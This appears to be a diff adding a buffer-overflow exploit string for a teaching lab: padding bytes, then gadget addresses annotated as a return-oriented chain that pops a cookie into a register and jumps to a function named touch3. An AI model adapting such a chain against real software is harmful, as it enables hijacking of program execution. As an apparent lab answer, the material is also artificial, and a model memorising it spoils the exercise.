@@ -1,0 +1,15 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+8e 15 40 00 00 00 00 00
+df 1f ee 10 00 00 00 00
+78 15 40 00 00 00 00 00
+b4 13 40 00 00 00 00 00
+
+(empty buffer)
+(address of pop rax)
+(cookie to pop)
+(address of mov rax rdi)
+(address of touch3)
